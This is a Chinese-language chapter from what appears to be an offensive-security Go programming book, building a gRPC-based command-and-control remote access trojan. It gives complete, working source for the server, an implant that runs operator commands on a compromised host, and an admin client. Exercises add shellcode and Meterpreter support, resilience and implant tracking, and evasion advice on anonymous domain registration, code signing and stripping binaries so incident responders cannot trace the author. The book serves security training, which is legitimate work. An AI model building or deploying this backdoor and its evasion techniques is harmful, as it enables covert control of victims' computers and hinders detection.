## 第十四章：构建命令与控制 RAT

![Image](img/common.jpg)

在本章中，我们将结合前几章的几节课，构建一个基本的命令与控制（C2）*远程访问木马*（*RAT*）。RAT 是攻击者用来远程操作受害者计算机的工具，例如访问文件系统、执行代码和嗅探网络流量。

构建这个 RAT 需要构建三个独立的工具：一个客户端植入程序，一个服务器和一个管理组件。客户端植入程序是 RAT 的一部分，运行在受害者的工作站上。服务器则与客户端植入程序进行交互，就像广泛使用的 C2 工具 Cobalt Strike 的团队服务器一样——它是 Cobalt Strike 的服务器组件，用于向受害系统发送命令。与团队服务器不同，团队服务器使用单一服务来促进服务器和管理功能，而我们将创建一个独立的管理组件，用于实际发出命令。这个服务器将作为中介，协调受害系统与与管理组件交互的攻击者之间的通信。

设计 RAT 的方式是无穷无尽的。在本章中，我们的目标是突出如何处理客户端和服务器之间的远程访问通信。因此，我们将展示如何构建一个简单且粗糙的版本，然后引导你进行重大改进，使你的特定版本更加健壮。这些改进在许多情况下需要你重新使用前几章中的内容和代码示例。你将运用你的知识、创造力和解决问题的能力来增强你的实现。

### 开始使用

为了开始，我们先回顾一下我们要做的事情：我们将创建一个服务器，接收来自管理组件的操作系统命令（我们也会创建该组件）。我们将创建一个植入程序，它定期轮询服务器，寻找新的命令，然后将命令输出发布回服务器。服务器再将结果返回给管理客户端，以便操作员（你）能够看到输出。

让我们首先安装一个工具，它将帮助我们处理所有这些网络交互，并查看该项目的目录结构。

#### 安装协议缓冲区以定义 gRPC API

我们将通过使用* gRPC*，一个由 Google 创建的高性能远程过程调用（RPC）框架，来构建所有的网络交互。RPC 框架允许客户端通过标准和定义的协议与服务器进行通信，而无需理解任何底层细节。gRPC 框架在 HTTP/2 上运行，使用高效的二进制结构传输消息。

像其他 RPC 机制（如 REST 或 SOAP）一样，我们的数据信息结构需要被定义，以便于它们的序列化和反序列化。幸运的是，我们有一种机制可以定义我们的数据和 API 函数，从而能够与 gRPC 一起使用。这种机制叫做协议缓冲（Protocol Buffers，简称 Protobuf），它为 API 和复杂数据定义提供了一种标准的语法，形式为 *.proto* 文件。现有工具可以将该定义文件编译成 Go 友好的接口存根和数据类型。事实上，这些工具可以生成多种语言的输出，意味着您可以使用 *.proto* 文件来生成 C# 存根和类型。

您的首要任务是安装 Protobuf 编译器。在本书中，我们不讲解安装过程，但您可以在官方 Go Protobuf 仓库的 “Installation” 部分找到完整的安装说明，地址是 *[`github.com/golang/protobuf/`](https://github.com/golang/protobuf/)*。另外，顺便也可以使用以下命令安装 gRPC 包：

```
> go get -u google.golang.org/grpc
```

#### 创建项目工作空间

接下来，让我们创建我们的项目工作空间。我们将创建四个子目录，分别用于三个组件（植入程序、服务器和管理组件）以及 gRPC API 定义文件。在每个组件目录中，我们将创建一个单独的 Go 文件（文件名与其包含的目录名相同），该文件将属于自己的 `main` 包。这让我们能够独立地编译和运行每个组件，且在运行 `go build` 时会生成描述性的二进制文件名。我们还将在 *grpcapi* 目录中创建一个名为 *implant.proto* 的文件。该文件将包含我们的 Protobuf 模式和 gRPC API 定义。以下是您应该拥有的目录结构：

```
$ tree
.
|-- client
|   |-- client.go
|-- grpcapi
|   |-- implant.proto
|-- implant
|   |-- implant.go
|-- server
    |-- server.go
```

在结构创建完成后，我们可以开始构建实现。在接下来的几个部分中，我们将带您逐步了解每个文件的内容。

### 定义和构建 gRPC API

下一步是定义我们 gRPC API 所使用的功能和数据。与构建和使用 REST 端点不同，后者有一套相对明确的预期（例如，它们使用 HTTP 动词和 URL 路径来定义要对哪些数据采取哪些操作），gRPC 则显得更加灵活。实际上，您是定义一个 API 服务，并将该服务的函数原型和数据类型与之绑定。我们将使用 Protobuf 来定义我们的 API。您可以通过快速的 Google 搜索找到 Protobuf 语法的完整解释，但我们在这里会简要说明。

至少，我们需要定义一个由操作员用来向服务器发送操作系统命令（工作）的管理服务。我们还需要一个由我们的植入程序用来从服务器获取工作并将命令输出返回给服务器的植入服务。Listing 14-1 展示了*implant.proto*文件的内容。（所有位于根目录的代码清单都存在于提供的 GitHub 仓库* [`github.com/blackhat-go/bhg/`](https://github.com/blackhat-go/bhg/)*中。）

```
   //implant.proto
   syntax = "proto3";
❶ package grpcapi;

   // Implant defines our C2 API functions
❷ service Implant {
       rpc FetchCommand (Empty) returns (Command);
       rpc SendOutput (Command) returns (Empty);
   }

   // Admin defines our Admin API functions
❸ service Admin {
       rpc RunCommand (Command) returns (Command);
   }

   // Command defines a with both input and output fields
❹ message Command {
       string In = 1;
       string Out = 2;
   }

   // Empty defines an empty message used in place of null
❺ message Empty {
   }
```

*Listing 14-1: 使用 Protobuf 定义 gRPC API (*[/ch-14/grpcapi/implant.proto](https://github.com/blackhat-go/bhg/blob/master/ch-14/grpcapi/implant.proto)*)*

还记得我们打算如何将这个定义文件编译成 Go 特定的工件吗？嗯，我们显式地包含了`package grpcapi` ❶，以指示编译器我们希望这些工件被创建在`grpcapi`包下。这个包的名称是任意的。我们选择这个名字是为了确保 API 代码与其他组件保持分离。

然后，我们的模式定义了一个名为`Implant`的服务和一个名为`Admin`的服务。我们将这两者分开是因为我们预期`Implant`组件与 API 的交互方式与`Admin`客户端不同。例如，我们不希望我们的`Implant`向服务器发送操作系统命令工作，就像我们不希望要求`Admin`组件将命令输出发送到服务器一样。

我们在`Implant`服务上定义了两个方法：`FetchCommand`和`SendOutput` ❷。定义这些方法就像在 Go 语言中定义一个`interface`。我们在这里的意思是，任何实现`Implant`服务的组件都需要实现这两个方法。`FetchCommand`方法接收一个`Empty`消息作为参数，并返回一个`Command`消息，用于从服务器获取任何未完成的操作系统命令。`SendOutput`方法将发送一个`Command`消息（包含命令输出）返回给服务器。这些消息，我们稍后会介绍，是任意的、复杂的数据结构，包含我们在端点之间传递数据所需的字段。

我们的`Admin`服务定义了一个方法：`RunCommand`，该方法接收一个`Command`消息作为参数，并期望读取一个`Command`消息 ❸。它的目的是允许你，RAT 操作员，在远程系统上运行操作系统命令，而该系统上有正在运行的植入程序。

最后，我们定义了将要传递的两个消息：`Command` 和 `Empty`。`Command` 消息包含两个字段，一个用于保持操作系统命令本身（一个名为 `In` 的字符串），另一个用于保持命令输出（一个名为 `Out` 的字符串） ❹。注意，消息和字段名称是任意的，但我们会给每个字段分配一个数值。你可能会想，如果我们将 `In` 和 `Out` 定义为字符串，如何给它们分配数值？答案是，这是一个模式定义，而不是实现。这些数值表示字段在消息中出现的位置偏移。我们在这里的意思是 `In` 会先出现，`Out` 会排在第二。`Empty` 消息没有字段 ❺。这是一个小技巧，用来解决 Protobuf 不明确允许将 null 值传入或从 RPC 方法返回的问题。

现在我们已经有了我们的模式。为了完成 gRPC 定义，我们需要编译该模式。请从 *grpcapi* 目录运行以下命令：

```
> protoc -I . implant.proto --go_out=plugins=grpc:./
```

该命令在完成我们之前提到的初始安装后可用，它会在当前目录中查找名为 *implant.proto* 的 Protobuf 文件，并在当前目录中生成 Go 特定的输出。一旦成功执行该命令，你应该会在 *grpcapi* 目录下看到一个名为 *implant.pb.go* 的新文件。这个新文件包含了 Protobuf 模式中为服务和消息创建的 `interface` 和 `struct` 定义。我们将利用它来构建我们的服务器、植入和管理员组件。让我们逐个构建这些组件。

### 创建服务器

让我们从服务器开始，它将接受来自管理员客户端的命令和来自植入的轮询请求。服务器将是最复杂的组件，因为它需要同时实现 `Implant` 和 `Admin` 服务。此外，由于它充当管理员组件和植入之间的中介，它需要代理并管理来自每一方的消息。

#### 实现协议接口

首先，让我们来看一下 *server/server.go* 中的服务器核心部分 (清单 14-2)。在这里，我们实现了服务器所需的接口方法，允许它从共享通道读取命令并写入命令。

```
❶ type implantServer struct {
       work, output chan *grpcapi.Command
   }
   type adminServer struct {
       work, output chan *grpcapi.Command
   }

❷ func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
       s := new(implantServer)
       s.work = work
       s.output = output
       return s
   }

   func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
       s := new(adminServer)
       s.work = work
       s.output = output
       return s
   }

❸ func (s *implantServer) FetchCommand(ctx context.Context, \
   empty *grpcapi.Empty) (*grpcapi.Command, error) {
       var cmd = new(grpcapi.Command)
    ❹ select {
       case cmd, ok := <-s.work:
           if ok {
               return cmd, nil
           }
           return cmd, errors.New("channel closed")
       default:
           // No work
           return cmd, nil
       }
   }

❺ func (s *implantServer) SendOutput(ctx context.Context, \
   result *grpcapi.Command)
   (*grpcapi.Empty, error) {
       s.output <- result
       return &grpcapi.Empty{}, nil
   }

❻ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) \
   (*grpcapi.Command, error) {
       var res *grpcapi.Command
       go func() {
           s.work <- cmd
       }()
       res = <-s.output
       return res, nil
   }
```

*清单 14-2：定义服务器类型 (*[/ch-14/server/server.go](https://github.com/blackhat-go/bhg/blob/master/ch-14/server/server.go)*)*

为了提供我们的管理员和植入 API，我们需要定义实现所有必要接口方法的服务器类型。这是启动 `Implant` 或 `Admin` 服务的唯一方式。也就是说，我们需要正确地定义 `FetchCommand(ctx context.Context, empty *grpcapi.Empty)`、`SendOutput(ctx context.Context, result *grpcapi.Command)` 和 `RunCommand(ctx context.Context, cmd *grpcapi.Command)` 方法。为了保持我们的植入和管理员 API 互相独立，我们将它们实现为不同的类型。

首先，我们创建了名为`implantServer`和`adminServer`的`structs`，它们将实现必要的方法 ❶。每个类型包含相同的字段：两个通道，用于发送和接收工作和命令输出。这是一个相当简单的方式，帮助我们的服务器在管理员和 implant 组件之间代理命令及其响应。

接下来，我们定义了几个辅助函数，`NewImplantServer(work, output chan *grpcapi.Command)`和`NewAdminServer(work, output chan *grpcapi.Command)`，用于创建新的`implantServer`和`adminServer`实例 ❷。它们仅用于确保通道被正确初始化。

现在进入有趣的部分：我们 gRPC 方法的实现。你可能会注意到这些方法与 Protobuf 模式并不完全匹配。例如，我们在每个方法中都接收一个`context.Context`参数，并返回一个`error`。你之前运行的`protoc`命令在编译你的模式时将这些内容添加到了生成文件中的每个接口方法定义。这让我们能够管理请求的上下文并返回错误。这对于大多数网络通信来说是非常标准的做法。编译器帮助我们免去了在模式文件中显式要求这些内容的麻烦。

我们在`implantServer`上实现的第一个方法是`FetchCommand(ctx context.Context, empty *grpcapi.Empty)`，它接收一个`*grpcapi.Empty`并返回一个`*grpcapi.Command` ❸。回想一下，我们定义这个`Empty`类型是因为 gRPC 不显式允许空值。我们不需要接收任何输入，因为客户端 implant 会调用`FetchCommand(ctx context.Context, empty *grpcapi.Empty)`方法，这实际上是一个轮询机制，用来询问：“嘿，你有工作给我吗？”这个方法的逻辑稍微复杂一些，因为只有当我们确实有工作可以发送时，才能将工作发送给 implant。因此，我们使用`select`语句 ❹在`work`通道上判断是否有工作。以这种方式从通道读取是*非阻塞的*，意味着如果通道没有数据可读，执行将运行`default`分支。这是理想的，因为我们的 implant 会周期性地调用`FetchCommand(ctx context.Context, empty *grpcapi.Empty)`方法，以接近实时的方式获取工作。如果通道中确实有工作，我们将返回命令。在后台，命令将被序列化并通过网络发送回 implant。

第二个 `implantServer` 方法，`SendOutput(ctx context.Context,` `result *grpcapi.Command)`，将接收到的 `*grpcapi.Command` 推送到 `output` 通道❺。回想一下，我们将 `Command` 定义为不仅包含一个用于运行命令的字符串字段，还包含一个字段来存储命令的输出。由于我们接收到的 `Command` 已经将输出字段填充为植入体执行命令的结果，因此 `SendOutput(ctx context.Context, result *grpcapi.Command)` 方法只是简单地将植入体的结果取出，并将其放入一个通道，供我们的管理员组件稍后读取。

最后一个 `implantServer` 方法，`RunCommand(ctx context.Context, cmd` `*grpcapi.Command)`，是在 `adminServer` 类型上定义的。它接收一个尚未发送到植入体的 `Command`❻。它表示管理员组件希望植入体执行的工作单元。我们使用 goroutine 将工作放入 `work` 通道。由于我们使用的是无缓冲通道，这个操作会阻塞执行。尽管如此，我们仍然需要能够从输出通道中读取数据，因此我们使用 goroutine 将工作放入通道并继续执行。执行被阻塞，等待 `output` 通道上的响应。当我们收到响应时，我们返回结果。同样，我们期望这个结果——一个 `Command`——其输出字段已经填充为植入体执行操作系统命令的结果。

#### 编写 main() 函数

清单 14-3 显示了 *server/server.go* 文件中的 `main()` 函数，该函数运行两个独立的服务器——一个接收来自管理员客户端的命令，另一个接收来自植入体的轮询。我们有两个监听器，以便可以限制对管理员 API 的访问——我们不希望随便的人与之交互——同时我们希望植入体监听一个可以从限制性网络访问的端口。

```
func main() {
 ❶ var (
        implantListener, adminListener net.Listener
        err                            error
        opts                           []grpc.ServerOption
        work, output                   chan *grpcapi.Command
    )
 ❷ work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 ❸ implant := NewImplantServer(work, output)
    admin := NewAdminServer(work, output)
 ❹ if implantListener, err = net.Listen("tcp", \
    fmt.Sprintf("localhost:%d", 4444)); err != nil {
        log.Fatal(err)
    }
    if adminListener, err = net.Listen("tcp", \
    fmt.Sprintf("localhost:%d", 9090)); err != nil {
        log.Fatal(err)
    }
 ❺ grpcAdminServer, grpcImplantServer := \
    grpc.NewServer(opts...), grpc.NewServer(opts...)
 ❻ grpcapi.RegisterImplantServer(grpcImplantServer, implant)
    grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 ❼ go func() {
        grpcImplantServer.Serve(implantListener)
    }()
 ❽ grpcAdminServer.Serve(adminListener)
}
```

*清单 14-3：运行管理员和植入体服务器 (*[/ch-14/server/server.go](https://github.com/blackhat-go/bhg/blob/master/ch-14/server/server.go)*)*

首先，我们声明变量❶。我们使用两个监听器：一个用于植入体服务器，另一个用于管理员服务器。这样做是为了使我们能够将管理员 API 服务在与植入体 API 分开的端口上。

我们创建了用于在植入体和管理员服务之间传递消息的通道❷。注意，我们在通过调用 `NewImplantServer(work, output)` 和 `NewAdminServer(work, output)` 初始化植入体和管理员服务器时使用了相同的通道❸。通过使用相同的通道实例，我们让管理员服务器和植入体服务器通过这个共享的通道相互通信。

接下来，我们为每个服务器启动网络监听器，将 `implantListener` 绑定到 4444 端口，将 `adminListener` 绑定到 9090 端口 ❹。通常我们会使用端口 80 或 443，这些是常见的 HTTP/s 端口，通常允许通过网络传出，但在这个示例中，我们只是为测试目的选择了一个任意的端口，以避免与我们开发机器上运行的其他服务发生冲突。

我们已经定义了网络级监听器。现在我们设置我们的 gRPC 服务器和 API。我们通过调用 `grpc.NewServer()` ❺ 创建了两个 gRPC 服务器实例（一个用于我们的 admin API，另一个用于我们的 implant API）。这初始化了核心 gRPC 服务器，将处理所有网络通信等工作。我们只需要告诉它使用我们的 API。我们通过调用 `grpcapi.RegisterImplantServer(grpcImplantServer, implant)` ❻ 和 `grpcapi.RegisterAdminServer(grpcAdminServer, admin)` 来注册 API 实现实例（在我们的示例中分别命名为 `implant` 和 `admin`）。请注意，尽管我们创建了一个名为 `grpcapi` 的包，但我们并没有定义这两个函数；是 `protoc` 命令定义的。它在 *implant.pb.go* 中为我们创建了这些函数，作为创建 implant 和 admin gRPC API 服务器新实例的手段。相当聪明！

到此为止，我们已经定义了 API 的实现并将其注册为 gRPC 服务。最后一步是通过调用 `grpcImplantServer.Serve(implantListener)` ❼ 启动我们的 implant 服务器。我们在 goroutine 中执行这一操作，以防止代码阻塞。毕竟，我们还需要启动 admin 服务器，这通过调用 `grpcAdminServer.Serve(adminListener)` ❽ 来完成。

服务器现在已经完成，可以通过运行 `go run` `server/server.go` 启动。 当然，由于没有任何东西与服务器交互，所以目前不会发生任何事情。接下来让我们继续看下一个组件——我们的 implant。

### 创建客户端 implant

客户端 implant 设计用于运行在被攻破的系统上。它将充当一个后门，通过它我们可以执行操作系统命令。在这个示例中，implant 会定期轮询服务器，询问是否有任务。如果没有任务，什么都不发生。否则，implant 执行操作系统命令并将输出发送回服务器。

Listing 14-4 显示了 *implant/implant.go* 的内容。

```
func main() {
    var
    (
        opts   []grpc.DialOption
        conn   *grpc.ClientConn
        err    error
        client grpcapi.ImplantClient ❶
    )

    opts = append(opts, grpc.WithInsecure())
    if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil { ❷
        log.Fatal(err)
    }
    defer conn.Close()
    client = grpcapi.NewImplantClient(conn) ❸

    ctx := context.Background()
    for { ❹
        var req = new(grpcapi.Empty)
        cmd, err := client.FetchCommand(ctx, req) ❺
        if err != nil {
            log.Fatal(err)
        }
        if cmd.In == "" {
            // No work
            time.Sleep(3*time.Second)
            continue
        }

        tokens := strings.Split(cmd.In, " ") ❻
        var c *exec.Cmd
        if len(tokens) == 1 {
            c = exec.Command(tokens[0])
        } else {
            c = exec.Command(tokens[0], tokens[1:]...)
        }
        buf, err := c.CombinedOutput()❼
        if err != nil {
            cmd.Out = err.Error()
        }
        cmd.Out += string(buf)
        client.SendOutput(ctx, cmd) ❽
    }
}
```

*Listing 14-4: 创建 implant (*[/ch-14/implant/implant.go](https://github.com/blackhat-go/bhg/blob/master/ch-14/implant/implant.go)*)*

implant 代码仅包含一个 `main()` 函数。我们首先声明变量，包括一个 `grpcapi.ImplantClient` 类型 ❶。`protoc` 命令为我们自动创建了这个类型。这个类型包含了所有必需的 RPC 函数存根，方便远程通信。

然后我们通过 `grpc.Dial(`target string`,` opts... DialOption`)` 建立连接，连接到运行在 4444 端口的植入物服务器 ❷。我们将使用这个连接来调用 `grpcapi.NewImplantClient(conn)` ❸（这是 `protoc` 为我们创建的一个函数）。现在我们拥有了 gRPC 客户端，它应该已经与我们的植入物服务器建立了连接。

我们的代码继续使用一个无限的 `for` 循环 ❹ 来轮询植入物服务器，反复检查是否有需要执行的工作。它通过调用 `client.FetchCommand(ctx, req)`，传入请求上下文和 `Empty` 结构 ❺ 来完成这一操作。在幕后，它正在连接我们的 API 服务器。如果收到的响应中 `cmd.In` 字段为空，我们会暂停 3 秒钟，然后再试一次。当接收到工作单元时，植入物通过调用 `strings.Split(cmd.In, " ")` ❻ 将命令分割成单独的词和参数。这是必要的，因为 Go 执行操作系统命令的语法是 `exec.Command(`name`,` args`...)`，其中 name 是要执行的命令，`args`... 是该操作系统命令使用的任何子命令、标志和参数。Go 这样做是为了防止操作系统命令注入，但这也使得我们的执行变得复杂，因为我们必须在执行之前将命令分割成相关的部分。我们运行命令并通过 `c.CombinedOutput()` ❼ 收集输出。最后，我们将该输出并发起一个 gRPC 调用 `client.SendOutput(ctx, cmd)`，将我们的命令及其输出发送回服务器 ❽。

你的植入物已经完成，可以通过 `go run implant/implant.go` 来运行。它应该连接到你的服务器。再次强调，它不会有高潮，因为没有需要执行的工作。只是几个正在运行的进程，建立连接但没有做任何有意义的事情。让我们来解决这个问题。

### 构建管理组件

管理组件是我们 RAT 的最后一部分。它是我们实际进行工作的地方。工作将通过我们的管理员 gRPC API 发送到服务器，服务器再将其转发给植入物。服务器从植入物获取输出，并将其发送回管理员客户端。清单 14-5 显示了 *client/client.go* 中的代码。

```
func main() {
    var
    (
        opts   []grpc.DialOption
        conn   *grpc.ClientConn
        err    error
        client grpcapi.AdminClient ❶
    )

    opts = append(opts, grpc.WithInsecure())
    if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil { ❷
        log.Fatal(err)
    }
    defer conn.Close()
    client = grpcapi.NewAdminClient(conn) ❸
 var cmd = new(grpcapi.Command)
    cmd.In = os.Args[1] ❹
    ctx := context.Background()
    cmd, err = client.RunCommand(ctx, cmd) ❺
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(cmd.Out) ❻
}
```

*清单 14-5：创建管理员客户端 (*[/ch-14/client/client.go](https://github.com/blackhat-go/bhg/blob/master/ch-14/client/client.go)*)*

我们首先定义 `grpcapi.AdminClient` 变量 ❶，在端口 9090 上建立与管理服务器的连接 ❷，并在调用 `grpcapi.NewAdminClient(conn)` 时使用该连接 ❸，从而创建我们的管理员 gRPC 客户端实例。（记住，`grpcapi.AdminClient` 类型和 `grpcapi.NewAdminClient()` 函数是由 `protoc` 为我们创建的。）在继续之前，请将此客户端创建过程与植入物代码进行比较。注意它们之间的相似之处，但也要留意类型、函数调用和端口的微妙差异。

假设有一个命令行参数，我们从中读取操作系统命令❹。当然，如果我们检查是否传入了参数，代码会更加健壮，但在这个示例中我们不太担心这一点。我们将该命令字符串分配给 `cmd.In`。我们将这个 `cmd`，一个 `*grpcapi.Command` 实例，传递给我们的 gRPC 客户端的 `RunCommand(ctx context.Context, cmd *grpcapi.Command)` 方法❺。在后台，这个命令被序列化并发送到我们之前创建的管理员服务器。响应收到后，我们预计输出将显示操作系统命令的结果。我们将该输出写入控制台❻。

### 运行 RAT

现在，假设你已经启动了服务器和植入程序，你可以通过 `go run client/client.go` 命令执行你的管理员客户端。你应该在管理员客户端的终端上收到输出，并将其显示到屏幕上，如下所示：

```
$ go run client/client.go 'cat /etc/resolv.conf'
domain Home
nameserver 192.168.0.1
nameserver 205.171.3.25
```

就是这样——一个工作的 RAT。输出显示了远程文件的内容。运行其他命令来查看你的植入程序实际运作情况。

### 改进 RAT

正如我们在本章开始时提到的，我们故意将这个 RAT 保持小巧并且功能简单。它扩展性差，无法优雅地处理错误或连接中断，缺乏许多基本功能，这些功能能够帮助你避免被发现、跨越网络、提升权限等等。

我们没有在示例中进行所有这些改进，而是列出了一系列你可以自行实现的增强功能。我们会讨论一些考虑因素，但每一项都将作为练习留给你。为了完成这些练习，你可能需要参考本书的其他章节，深入研究 Go 包的文档，并尝试使用通道和并发。 这是一个将你的知识和技能进行实践测试的机会。勇往直前，让我们为你感到骄傲，年轻的学徒。

#### 加密你的通信

所有 C2 工具应当加密它们的网络流量！这对于植入程序和服务器之间的通信尤其重要，因为你应该预期在任何现代企业环境中都会有出口网络监控。

修改你的植入程序，使用 TLS 进行这些通信。这将要求你在客户端和服务器上为 `[]grpc.DialOptions` 切片设置额外的值。同时，你应该可能修改代码，使得服务绑定到定义好的接口，并默认监听和连接到 `localhost`。这将防止未经授权的访问。

你需要考虑的一个问题，特别是如果你要执行基于相互证书的身份验证时，就是如何管理和处理植入程序中的证书和密钥。你应该将它们硬编码吗？存储在远程吗？或者通过某种神秘的魔法在运行时推导出它们，判断你的植入程序是否被授权连接到服务器？

#### 处理连接中断

既然我们在讨论通信问题，如果你的植入物无法连接到服务器，或者如果服务器在运行植入物时崩溃，会发生什么情况？你可能会注意到，这会破坏一切——植入物崩溃。如果植入物崩溃了，那么你就失去了对该系统的访问。这可能是个大问题，特别是如果最初的入侵是以一种难以重现的方式发生的。

解决这个问题。为你的植入物添加一些弹性，以便它在连接丢失时不会立即崩溃。这可能涉及将`log.Fatal(err)`调用替换为逻辑，这段逻辑会再次调用`grpc.Dial(`target string`,` opts ...DialOption`)`。

#### 注册植入物

你需要能够跟踪你的植入物。目前，我们的管理客户端发送一个命令，期望只存在一个植入物。没有跟踪或注册植入物的方法，更不用说发送命令到特定植入物的方式了。

添加一个功能，使得植入物在首次连接时会自动注册到服务器，并添加一个功能，让管理客户端可以获取已注册植入物的列表。也许你会为每个植入物分配一个唯一的整数，或者使用 UUID（查看 *[`github.com/google/uuid/`](https://github.com/google/uuid/)*）。这将需要修改管理端和植入物的 API，从你的*implant.proto*文件开始。向`Implant`服务中添加`RegisterNewImplant` RPC 方法，向`Admin`服务中添加`ListRegisteredImplants`方法。使用`protoc`重新编译模式，实现在*server/server.go*中的接口方法，并将新功能添加到*client/client.go*（管理端）和*implant/implant.go*（植入物端）的逻辑中。

#### 添加数据库持久性

如果你完成了本节中的前面练习，你已经为植入物添加了抵御连接中断的弹性，并设置了注册功能。此时，你很可能会在*server/server.go*中维护注册植入物的列表。如果你需要重启服务器或它崩溃了怎么办？你的植入物会继续重新连接，但当它们重新连接时，你的服务器将无法知道哪些植入物已经注册，因为你会丢失植入物与 UUID 的映射关系。

更新你的服务器代码，将这些数据存储在你选择的数据库中。对于一个快速且容易实现的解决方案，依赖最小，可以考虑使用 SQLite 数据库。有几种 Go 驱动可供选择。我们个人使用了*go-sqlite3*（*[`github.com/mattn/go-sqlite3/`](https://github.com/mattn/go-sqlite3/)*）。

#### 支持多个植入物

实际上，你需要支持多个同时进行的植入物，轮询你的服务器获取任务。这会使你的远程访问工具（RAT）变得更加有用，因为它可以管理多个植入物，而不仅仅是一个，但这也需要相当大的改动。

这是因为，当你想在植入物上执行命令时，你可能希望只在一个特定的植入物上执行，而不是在第一个向服务器请求工作的植入物上执行。你可以依赖于注册过程中创建的植入物 ID，以保持植入物之间的互斥，并适当地引导命令和输出。实现这个功能，使你能够明确选择要在哪个植入物上运行命令。

更加复杂的是，你需要考虑到可能会有多个管理员操作员同时发送命令，这在与团队协作时很常见。这意味着，你可能希望将`work`和`output`通道从无缓冲类型转换为有缓冲类型。这样可以避免在有多个消息正在传输时执行被阻塞。然而，为了支持这种多路复用，你需要实现一个机制，可以将请求者与其正确的响应进行匹配。例如，如果两个管理员操作员同时向植入物发送工作命令，植入物会生成两个独立的响应。如果操作员 1 发送`ls`命令，而操作员 2 发送`ifconfig`命令，那么让操作员 1 收到`ifconfig`命令的输出是不可取的，反之亦然。

#### 添加植入功能

我们的实现期望植入物只接收并运行操作系统命令。然而，其他 C2 软件包含了许多方便的功能，拥有这些功能会更加实用。例如，能够上传或下载文件到植入物并从植入物下载文件会很有用。如果我们希望在不接触磁盘的情况下启动 Meterpreter shell，运行原始 shellcode 也会很有用。扩展当前功能以支持这些额外的特性。

#### 链接操作系统命令

由于 Go 的`os/exec`包创建和运行命令的方式，你目前无法将一个命令的输出通过管道传递给第二个命令作为输入。例如，在我们当前的实现中，`ls -la | wc -l`是无法工作的。为了解决这个问题，你需要调整命令变量，该变量是在调用`exec.Command()`时创建的命令实例。你可以修改 stdin 和 stdout 属性以便适当地重定向它们。当与`io.Pipe`结合使用时，你可以强制一个命令的输出（例如`ls -la`）作为随后的命令（例如`wc -l`）的输入。

#### 增强植入物的真实性并执行良好的 OPSEC

在你为该章节的第一个练习中的植入物添加加密通信时，是否使用了自签名证书？如果是的话，传输和后端服务器可能会引起设备和检查代理的怀疑。相反，使用私密或匿名的联系信息通过证书颁发机构注册一个域名，以创建一个合法的证书。此外，如果你有能力，考虑获取一个代码签名证书来签署你的植入物二进制文件。

此外，考虑修改源代码位置的命名方案。当你构建二进制文件时，文件将包含包路径。描述性的路径名可能会把事件响应者引导回你。此外，在构建二进制文件时，考虑移除调试信息。这样做不仅有助于减小二进制文件的体积，还能使其更难以反汇编。可以使用以下命令来实现：

```
$ go build -ldflags="-s -w" implant/implant.go
```

这些标志会传递给链接器，用于移除调试信息并剥离二进制文件。

#### 添加 ASCII 艺术

你的实现可能是一团糟，但如果它有 ASCII 艺术，那就是合法的。好吧，我们并不是很认真的说这个。但似乎每个安全工具都有 ASCII 艺术，不知为何，所以也许你应该在你的工具中加入它。问候语可选。

### 概述

Go 语言非常适合编写跨平台的植入物，例如你在这一章节中创建的 RAT（远程访问木马）。创建植入物可能是这个项目中最困难的部分，因为与设计用于操作系统 API 的语言（如 C# 和 Windows API）相比，使用 Go 语言与底层操作系统交互会更具挑战性。此外，由于 Go 语言构建的是静态编译的二进制文件，植入物可能会导致二进制文件体积较大，这可能会对传输造成一些限制。

但对于后端服务来说，根本没有什么比这更好的了。本书的作者之一（Tom）与另一位作者（Dan）有一个持续的打赌，如果他决定放弃使用 Go 语言做后端服务和通用工具，他就得支付 $10,000。到目前为止，他并没有任何放弃的迹象（尽管 Elixir 看起来很酷）。通过本书中描述的所有技巧，你应该能够为构建一些强大的框架和工具打下坚实的基础。

我们希望你和我们一样，享受阅读这本书和参与练习的过程。我们鼓励你继续编写 Go 代码，并利用本书中学到的技能构建一些小工具，来增强或替代你当前的任务。然后，随着经验的积累，开始参与更大的代码库，构建一些令人惊叹的项目。为了继续提升你的技能，可以看看一些更受欢迎的大型 Go 项目，特别是来自大型组织的项目。观看一些大会的讲座，比如 GopherCon，它们能引导你学习更高级的话题，并讨论编程中的陷阱以及如何提升你的编程能力。最重要的是，享受其中——如果你做出了什么了不起的东西，告诉我们！我们在未来再见。
